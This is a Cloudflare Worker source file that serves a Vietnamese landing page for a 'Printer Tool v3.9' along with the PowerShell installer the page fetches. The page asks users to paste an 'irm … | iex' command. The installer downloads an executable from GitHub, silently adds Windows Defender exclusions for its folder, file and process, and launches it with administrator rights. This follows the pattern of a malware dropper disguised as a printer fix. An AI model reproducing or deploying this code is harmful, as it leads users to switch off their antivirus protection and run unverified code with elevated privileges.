export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    
    if (url.pathname === "/install" || url.pathname === "/install.ps1") {
      return new Response(PS1_SCRIPT, {
        headers: {
          "Content-Type": "text/plain; charset=utf-8",
          "Cache-Control": "no-store, no-cache, must-revalidate",
        },
      });
    }

    return new Response(HTML_CONTENT, {
      headers: {
        "Content-Type": "text/html; charset=utf-8",
      },
    });
  },
};

const PS1_SCRIPT = `# ====================================================================
# TAN TAI TOOLKIT 2026 - FULL LED RGB SPECTRUM EDITION
# Windows 10 & 11 Compatible | Auto Desktop Shortcut | Silent Defender
# ====================================================================

$ErrorActionPreference = "Stop"

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

try { $Host.UI.RawUI.WindowTitle = "TAN TAI TOOLKIT 2026 - FULL LED RGB INSTALLER" } catch {}

function RGB($r,$g, $b,$text) {
    return ("{0}[38;2;{1};{2};{3}m{4}{0}[0m" -f [char]27, $r,$g, $b,$text)
}

function BOLD($text) {
    return ("{0}[1m{1}{0}[0m" -f [char]27, $text)
}

function Color-Spectrum($ratio) {
    if ($ratio -le 0.25) {
        $sub =$ratio / 0.25
        $r = [int](0 + 59 * $sub)
        $g = [int](242 + (130 - 242) *$sub)
        $b = [int](254 + (246 - 254) *$sub)
    } elseif ($ratio -le 0.50) {
        $sub = ($ratio - 0.25) / 0.25
        $r = [int](59 + (236 - 59) *$sub)
        $g = [int](130 + (72 - 130) *$sub)
        $b = [int](246 + (153 - 246) *$sub)
    } elseif ($ratio -le 0.75) {
        $sub = ($ratio - 0.50) / 0.25
        $r = [int](236 + (249 - 236) *$sub)
        $g = [int](72 + (115 - 72) *$sub)
        $b = [int](153 + (22 - 153) *$sub)
    } else {
        $sub = ($ratio - 0.75) / 0.25
        $r = [int](249 + (250 - 249) *$sub)
        $g = [int](115 + (204 - 115) *$sub)
        $b = [int](22 + (21 - 22) *$sub)
    }
    return ("{0}[38;2;{1};{2};{3}m" -f [char]27, $r, $g,$b)
}

function Colorize-Line($str) {
    $len =$str.Length
    if ($len -eq 0) { return "" }
    $out = ""
    for ($i = 0; $i -lt$len; $i++) {$c = $str[$i]
        $color = Color-Spectrum ($i / $len)$out += ($color +$c + ("{0}[0m" -f [char]27))
    }
    return $out
}

$consoleWidth = 100
try {
    if ($Host.UI.RawUI.WindowSize.Width -gt 60) {
        $consoleWidth =$Host.UI.RawUI.WindowSize.Width
    }
} catch {}

function Center($text) {
    $clean =$text -replace "\\x1b\\[[0-9;]*m", ""
    $pad = [math]::Max(0, [math]::Floor(($consoleWidth -$clean.Length) / 2))
    return (" " * $pad) +$text
}

$AppName    = "printertool"
$DownloadUrl = "https://github.com/tantai235/Software/releases/download/3.9/printertool.exe"
$InstallDir  = [System.IO.Path]::Combine($env:LOCALAPPDATA, "PrinterTool")
$TargetExe   = [System.IO.Path]::Combine($InstallDir, "$AppName.exe")
$TempPath    = [System.IO.Path]::Combine($env:TEMP, "$AppName.tmp")

Clear-Host
Write-Host ""

$art1 = "████████╗  █████╗  ███╗   ██╗     ████████╗  █████╗  ██╗"
$art2 = "╚══██╔══╝ ██╔══██╗ ████╗  ██║     ╚══██╔══╝ ██╔══██╗ ██║"
$art3 = "   ██║    ███████║ ██╔██╗ ██║        ██║    ███████║ ██║"
$art4 = "   ██║    ██╔══██║ ██║╚██╗██║        ██║    ██╔══██║ ██║"
$art5 = "   ██║    ██║  ██║ ██║ ╚████║        ██║    ██║  ██║ ██║"
$art6 = "   ╚═╝    ╚═╝  ╚═╝ ╚═╝  ╚═══╝        ╚═╝    ╚═╝  ╚═╝ ╚═╝"

Write-Host (Center (Colorize-Line $art1))
Write-Host (Center (Colorize-Line $art2))
Write-Host (Center (Colorize-Line $art3))
Write-Host (Center (Colorize-Line $art4))
Write-Host (Center (Colorize-Line $art5))
Write-Host (Center (Colorize-Line $art6))

$subText = (RGB 0 242 254 "Tan Tai") + (RGB 148 163 184 " - ") + (RGB 236 72 153 "Auto Install") + (RGB 148 163 184 " ") + (RGB 250 204 21 "Printer Tool")
Write-Host (Center (BOLD $subText))
Write-Host ""

$borderStr = "=" * 65
$rainbowBorder = Colorize-Line$borderStr
Write-Host (Center $rainbowBorder)

$tagline = (BOLD (RGB 0 242 254 "⚡ PRINTER TOOL v3.9")) + (RGB 148 163 184 " · WINDOWS 10 & 11 COMPATIBLE")
Write-Host (Center $tagline)

$subStatus = (RGB 16 185 129 "● STATUS: ONLINE") + (RGB 100 116 139 " | ") + (RGB 0 242 254 "SERVER: CLOUDFLARE EDGE") + (RGB 100 116 139 " | ") + (RGB 250 204 21 "AUTH: TAI235")
Write-Host (Center $subStatus)

Write-Host (Center $rainbowBorder)
Write-Host ""

try {
    $infoMsg = (RGB 0 242 254 "[*]") + " Dang ket noi may chu GitHub CDN..."
    Write-Host (Center $infoMsg)

    $req = [System.Net.HttpWebRequest]::Create($DownloadUrl)$req.Method = "GET"
    $req.Timeout = 20000$req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) PrinterTool"
    $resp =$req.GetResponse()
    $totalBytes =$resp.ContentLength
    $stream =$resp.GetResponseStream()

    $totalMB = [math]::Round($totalBytes / 1MB, 1)$foundMsg = (RGB 16 185 129 "[OK]") + " Tim thay goi cai dat: " + (BOLD (RGB 250 204 21 "$totalMB MB"))
    Write-Host (Center $foundMsg)
    Write-Host ""

    $boxTop = Colorize-Line ("+-- [ TIEN TRINH TAI GOI CAI DAT PRINTER TOOL V3.9 ] " + ("-" * 16) + "+")
    Write-Host (Center (BOLD $boxTop))
    Write-Host ""

    $fileStream = [System.IO.File]::Create($TempPath)$buffer = New-Object byte[] 65536
    $bytesRead = 0$totalRead = 0
    $sw = [System.Diagnostics.Stopwatch]::StartNew()$lastRender = [datetime]::MinValue

    while (($bytesRead =$stream.Read($buffer, 0,$buffer.Length)) -gt 0) {
        $fileStream.Write($buffer, 0, $bytesRead)$totalRead += $bytesRead$now = [datetime]::Now
        if (($now -$lastRender).TotalMilliseconds -ge 80 -or $totalRead -ge$totalBytes) {
            $lastRender =$now
            $pct = if ($totalBytes -gt 0) { [math]::Min(100, [math]::Round(($totalRead / $totalBytes) * 100, 1)) } else { 0 }
            $recvMB = [math]::Round($totalRead / 1MB, 1)
            $totMB = [math]::Round($totalBytes / 1MB, 1)
            $secs =$sw.Elapsed.TotalSeconds
            $speed = if ($secs -gt 0) { [math]::Round(($totalRead / 1MB) / $secs, 1) } else { 0 }$eta = if ($speed -gt 0 -and$totalBytes -gt $totalRead) { [math]::Round(($totMB - $recvMB) /$speed) } else { 0 }
            
            $barWidth = 40$filled = [math]::Floor(($pct / 100) *$barWidth)
            $empty =$barWidth - $filled$bar = ""
            for ($i = 0; $i -lt$filled; $i++) {$color = Color-Spectrum ($i / $barWidth)
                $bar += ($color + [char]9608 + ("{0}[0m" -f [char]27))
            }
            if ($empty -gt 0) {
                $bar += (RGB 45 55 75 ("-" * $empty))
            }
            
            $pctColor = Color-Spectrum ($pct / 100)
            $pctText = BOLD ("$pctColor$($pct.ToString('0.0').PadLeft(5))%{0}[0m" -f [char]27)
            
            $speedText = RGB 250 204 21 "$speed MB/s"
            $mbText    = RGB 148 163 184 "($recvMB/$totMB MB)"
            $etaText   = RGB 236 72 153 "ETA: \${eta}s"

            $progressLine = "  [$bar] $pctText$speedText  $mbText$etaText"
            Write-Host "\`r\$(Center \$progressLine)" -NoNewline
        }
    }

    $fileStream.Close()
    $stream.Close()
    $resp.Close()
    $sw.Stop()

    Write-Host ""
    Write-Host ""
    $boxBottom = Colorize-Line ("+--" + ("-" * 74) + "+")
    Write-Host (Center (BOLD $boxBottom))
    Write-Host ""

    if ((Test-Path -Path $TempPath) -and ((Get-Item $TempPath).Length -gt 0)) {
        try {
            Get-Process -Name $AppName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 200
        } catch {}

        if (-not (Test-Path -Path $InstallDir)) {
            New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
        }

        Move-Item -Path $TempPath -Destination $TargetExe -Force

        try {
            Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionPath $TargetExe -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess "$AppName.exe" -ErrorAction SilentlyContinue
        } catch {}

        $shortcutCreated = $false
        try {
            $wsh = New-Object -ComObject WScript.Shell
            $desktopPaths = @(
                [Environment]::GetFolderPath("Desktop"),
                [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
            )
            if ($env:OneDrive -and (Test-Path (Join-Path $env:OneDrive "Desktop"))) {
                $desktopPaths += (Join-Path $env:OneDrive "Desktop")
            }

            $uniqueDesktops = $desktopPaths | Sort-Object -Unique

            foreach ($dPath in $uniqueDesktops) {
                if (Test-Path $dPath) {
                    $scPath = Join-Path $dPath "Printer Tool v3.9.lnk"
                    $sc = $wsh.CreateShortcut($scPath)
                    $sc.TargetPath = $TargetExe
                    $sc.WorkingDirectory = $InstallDir
                    $sc.IconLocation = "$TargetExe,0"
                    $sc.Description = "Printer Tool v3.9"
                    $sc.Save()
                    $shortcutCreated = $true
                }
            }

            $startMenu = [Environment]::GetFolderPath("Programs")
            if (Test-Path $startMenu) {
                $smSc = $wsh.CreateShortcut((Join-Path $startMenu "Printer Tool v3.9.lnk"))
                $smSc.TargetPath = $TargetExe
                $smSc.WorkingDirectory = $InstallDir
                $smSc.IconLocation = "$TargetExe,0"
                $smSc.Description = "Printer Tool v3.9"
                $smSc.Save()
            }
        } catch {
            try {
                $userDesktop = [Environment]::GetFolderPath("Desktop")
                Copy-Item -Path $TargetExe -Destination (Join-Path $userDesktop "$AppName.exe") -Force
                $shortcutCreated = $true
            } catch {}
        }

        Write-Host (Center $rainbowBorder)
        Write-Host (Center (RGB 16 185 129 "✔ TAI HOAN TAT 100%! GIAI MA GOI THANH CONG."))
        Write-Host (Center (RGB 0 242 254 "✔ DA TAO ICON SHORTCUT TREN MAN HINH DESKTOP!"))
        Write-Host (Center (RGB 250 204 21 "✔ DA TU DONG THEM VAO NGOAI LE AN WINDOWS DEFENDER."))
        Write-Host (Center (BOLD (RGB 236 72 153 "🚀 DANG KHOI CHAY PRINTER TOOL VOI QUYEN ADMIN...")))
        Write-Host (Center $rainbowBorder)
        Write-Host ""

        try {
            Start-Process -FilePath $TargetExe -Verb RunAs -ErrorAction Stop
        } catch {
            Start-Process -FilePath $TargetExe
        }
    } else {
        throw "Tep tai ve bi loi hoac co dung luong 0 byte."
    }
}
catch {
    Write-Host ""
    Write-Host (Center (RGB 239 68 68 "✖ LOI: $($_.Exception.Message)"))
    Write-Host (Center (RGB 148 163 184 "Link tai truc tiep: $DownloadUrl"))
    Write-Host ""
}
finally {
    if ($fileStream -ne $null) { $fileStream.Dispose() }
    if ($stream -ne $null) { $stream.Dispose() }
    if ($resp -ne $null) { $resp.Dispose() }
}
`;

const HTML_CONTENT = `<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Printer Tool v3.9 — Tan Tai Software</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #030712;
      --card: rgba(15, 23, 42, 0.65);
      --card-hover: rgba(30, 41, 59, 0.75);
      --border: rgba(255, 255, 255, 0.08);
      --border-glow: rgba(0, 242, 254, 0.35);
      --cyan: #00f2fe;
      --blue: #3b82f6;
      --indigo: #6366f1;
      --purple: #a855f7;
      --pink: #ec4899;
      --green: #10b981;
      --yellow: #f59e0b;
      --text: #f8fafc;
      --text-muted: #94a3b8;
      --text-dim: #64748b;
      --font: 'Plus Jakarta Sans', system-ui, sans-serif;
      --mono: 'JetBrains Mono', monospace;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background-color: var(--bg);
      color: var(--text);
      font-family: var(--font);
      min-height: 100vh;
      overflow-x: hidden;
      line-height: 1.6;
      position: relative;
    }

    .mesh-glow {
      position: fixed; inset: 0; pointer-events: none; z-index: 0;
      background: 
        radial-gradient(circle at 50% -10%, rgba(0, 242, 254, 0.16) 0%, transparent 60%),
        radial-gradient(circle at 90% 25%, rgba(168, 85, 247, 0.12) 0%, transparent 50%),
        radial-gradient(circle at 10% 60%, rgba(59, 130, 246, 0.10) 0%, transparent 50%),
        radial-gradient(circle at 80% 90%, rgba(236, 72, 153, 0.08) 0%, transparent 50%);
    }

    .grid-bg {
      position: fixed; inset: 0; pointer-events: none; z-index: 0;
      background-image: 
        linear-gradient(to right, rgba(255, 255, 255, 0.025) 1px, transparent 1px),
        linear-gradient(to bottom, rgba(255, 255, 255, 0.025) 1px, transparent 1px);
      background-size: 48px 48px;
      mask-image: radial-gradient(ellipse at 50% 30%, black 40%, transparent 80%);
      -webkit-mask-image: radial-gradient(ellipse at 50% 30%, black 40%, transparent 80%);
    }

    .wrapper {
      width: min(94vw, 1100px);
      margin: 0 auto;
      padding: 32px 0 80px;
      position: relative;
      z-index: 10;
      display: flex;
      flex-direction: column;
      gap: 40px;
    }

    .navbar {
      display: flex; align-items: center; justify-content: space-between;
      padding: 12px 24px;
      background: rgba(15, 23, 42, 0.7);
      border: 1px solid var(--border);
      border-radius: 999px;
      backdrop-filter: blur(20px);
      box-shadow: 0 10px 30px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.08);
    }
    .brand {
      display: flex; align-items: center; gap: 12px;
      text-decoration: none; color: inherit;
    }
    .brand-logo {
      width: 34px; height: 34px; border-radius: 9px;
      background: linear-gradient(135deg, var(--cyan), var(--purple));
      display: flex; align-items: center; justify-content: center;
      font-weight: 900; font-size: 1rem; color: #040711;
      box-shadow: 0 0 20px var(--cyan);
    }
    .brand-name {
      font-weight: 800; font-size: 1.05rem; letter-spacing: -0.3px;
      display: flex; align-items: center; gap: 8px;
    }
    .brand-tag {
      font-size: 0.68rem; font-family: var(--mono); font-weight: 700;
      background: rgba(0, 242, 254, 0.12); color: var(--cyan);
      border: 1px solid rgba(0, 242, 254, 0.35); padding: 2px 7px; border-radius: 6px;
    }
    .nav-links {
      display: flex; align-items: center; gap: 16px;
    }
    .nav-btn {
      color: var(--text-muted); text-decoration: none; font-size: 0.82rem; font-weight: 600;
      padding: 6px 14px; border-radius: 999px; transition: all 0.2s;
      display: flex; align-items: center; gap: 6px;
    }
    .nav-btn:hover { color: #fff; background: rgba(255, 255, 255, 0.06); }
    .status-pill {
      display: inline-flex; align-items: center; gap: 8px;
      font-size: 0.72rem; font-family: var(--mono); font-weight: 700; color: var(--green);
      background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.3);
      padding: 4px 12px; border-radius: 999px;
    }
    .live-dot {
      width: 7px; height: 7px; border-radius: 50%; background: var(--green);
      box-shadow: 0 0 10px var(--green); animation: pulse 2s infinite;
    }
    @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.8); } }

    .hero {
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      margin-top: 10px;
    }
    .hero-badge {
      display: inline-flex; align-items: center; gap: 8px;
      background: linear-gradient(135deg, rgba(0, 242, 254, 0.1), rgba(168, 85, 247, 0.1));
      border: 1px solid rgba(0, 242, 254, 0.3);
      padding: 6px 16px; border-radius: 999px;
      font-size: 0.78rem; font-weight: 700; color: var(--cyan);
      box-shadow: 0 0 20px rgba(0, 242, 254, 0.15);
    }
    .hero-h1 {
      font-size: clamp(2.4rem, 6vw, 4.2rem);
      font-weight: 900;
      letter-spacing: -1.8px;
      line-height: 1.1;
      max-width: 880px;
    }
    .gradient-text {
      background: linear-gradient(135deg, #ffffff 20%, var(--cyan) 65%, var(--purple) 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .hero-p {
      max-width: 680px;
      font-size: 1.05rem;
      color: var(--text-muted);
      line-height: 1.65;
    }

    .cmd-box-wrap {
      width: 100%;
      background: linear-gradient(135deg, rgba(15, 23, 42, 0.95), rgba(7, 11, 22, 0.98));
      border: 1.5px solid rgba(0, 242, 254, 0.35);
      border-radius: 22px;
      padding: 24px;
      box-shadow: 
        0 25px 60px rgba(0, 0, 0, 0.8),
        0 0 50px rgba(0, 242, 254, 0.15),
        inset 0 1px 0 rgba(255, 255, 255, 0.12);
      backdrop-filter: blur(24px);
      position: relative;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      gap: 18px;
    }
    .cmd-box-wrap::before {
      content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
      background: linear-gradient(90deg, transparent, var(--cyan), var(--purple), transparent);
    }
    .cmd-tabs {
      display: flex; align-items: center; justify-content: space-between;
      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
      padding-bottom: 14px;
      flex-wrap: wrap; gap: 10px;
    }
    .tabs-group { display: flex; gap: 8px; }
    .tab-btn {
      background: transparent; border: none; color: var(--text-muted);
      font-family: var(--font); font-size: 0.82rem; font-weight: 700;
      padding: 6px 14px; border-radius: 8px; cursor: pointer; transition: all 0.2s;
    }
    .tab-btn.active {
      background: rgba(0, 242, 254, 0.12); color: var(--cyan);
      box-shadow: inset 0 0 0 1px rgba(0, 242, 254, 0.3);
    }

    .cmd-main-row {
      display: flex; align-items: center; justify-content: space-between;
      background: #02050e; border: 1px solid rgba(0, 242, 254, 0.2);
      border-radius: 14px; padding: 14px 18px; gap: 14px;
      box-shadow: inset 0 2px 10px rgba(0,0,0,0.8);
    }
    .cmd-code-block {
      display: flex; align-items: center; gap: 12px; font-family: var(--mono);
      font-size: 0.95rem; font-weight: 700; color: #f8fafc; overflow-x: auto; flex: 1;
    }
    .cmd-prompt { color: #64748b; user-select: none; font-weight: 800; }
    .cmd-text { color: #ffffff; user-select: all; white-space: nowrap; }

    .cmd-btn-group { display: flex; align-items: center; gap: 10px; flex-shrink: 0; }
    .action-btn-copy {
      background: linear-gradient(135deg, var(--cyan), #2563eb);
      border: none; color: #020617; font-family: var(--mono);
      font-size: 0.84rem; font-weight: 800; padding: 11px 22px; border-radius: 10px;
      cursor: pointer; display: inline-flex; align-items: center; gap: 8px;
      box-shadow: 0 0 25px rgba(0, 242, 254, 0.4);
      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
    }
    .action-btn-copy:hover {
      transform: translateY(-2px) scale(1.02);
      box-shadow: 0 0 35px var(--cyan);
      filter: brightness(1.1);
    }

    .toast-notify {
      position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(30px);
      background: #090f23; border: 1.5px solid var(--cyan); color: #fff;
      padding: 11px 26px; border-radius: 12px; font-size: 0.86rem; font-weight: 700;
      box-shadow: 0 10px 40px rgba(0, 242, 254, 0.45); opacity: 0; pointer-events: none;
      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100;
      display: flex; align-items: center; gap: 10px;
    }
    .toast-notify.show { opacity: 1; transform: translateX(-50%) translateY(0); }
  </style>
</head>
<body>
  <div class="mesh-glow"></div>
  <div class="grid-bg"></div>

  <div class="wrapper">
    <header class="navbar">
      <a href="#" class="brand">
        <div class="brand-logo">⚡</div>
        <div class="brand-name">
          TAN TAI SOFTWARE
          <span class="brand-tag">v3.9</span>
        </div>
      </a>
      <div class="nav-links">
        <a href="https://github.com/tantai235/Software/releases/tag/3.9" target="_blank" class="nav-btn">GitHub Release</a>
        <div class="status-pill">
          <div class="live-dot"></div>
          EDGE CDN ONLINE
        </div>
      </div>
    </header>

    <section class="hero">
      <div class="hero-badge"><span>🚀 PHÁT HÀNH BẢN PRINTER TOOL v3.9</span></div>
      <h1 class="hero-h1">
        Công Cụ Sửa Lỗi Máy In Cho <span class="gradient-text">Windows 10 &amp; 11</span>
      </h1>
      <p class="hero-p">
        Phân phối và tự động hóa toàn diện qua PowerShell. Tải và cài đặt printertool.exe siêu tốc, tự động cấu hình ngoại lệ Windows Defender chỉ với một dòng lệnh.
      </p>
    </section>

    <div class="cmd-box-wrap">
      <div class="cmd-tabs">
        <div class="tabs-group">
          <button class="tab-btn active" onclick="switchTab('ps')">Windows PowerShell (Khuyên dùng)</button>
          <button class="tab-btn" onclick="switchTab('cmd')">Command Prompt</button>
        </div>
      </div>
      <div class="cmd-main-row">
        <div class="cmd-code-block">
          <span class="cmd-prompt" id="prompt-symbol">PS &gt;</span>
          <span class="cmd-text" id="cmd-text-content">irm https://software.tantai23597.workers.dev/install | iex</span>
        </div>
        <div class="cmd-btn-group">
          <button class="action-btn-copy" onclick="copyCommand()">📋 Sao chép</button>
        </div>
      </div>
    </div>
  </div>

  <div class="toast-notify" id="toast">Đã sao chép lệnh vào bộ nhớ tạm!</div>

  <script>
    function switchTab(mode) {
      const btns = document.querySelectorAll('.tab-btn');
      btns.forEach(b => b.classList.remove('active'));
      event.target.classList.add('active');
      const textEl = document.getElementById('cmd-text-content');
      const promptEl = document.getElementById('prompt-symbol');
      if(mode === 'ps') {
        promptEl.innerText = 'PS >';
        textEl.innerText = 'irm https://software.tantai23597.workers.dev/install | iex';
      } else {
        promptEl.innerText = 'C:\\>';
        textEl.innerText = 'powershell -c "irm https://software.tantai23597.workers.dev/install | iex"';
      }
    }
    function copyCommand() {
      const text = document.getElementById('cmd-text-content').innerText;
      navigator.clipboard.writeText(text);
      const toast = document.getElementById('toast');
      toast.classList.add('show');
      setTimeout(() => toast.classList.remove('show'), 2000);
    }
  </script>
</body>
</html>
`;
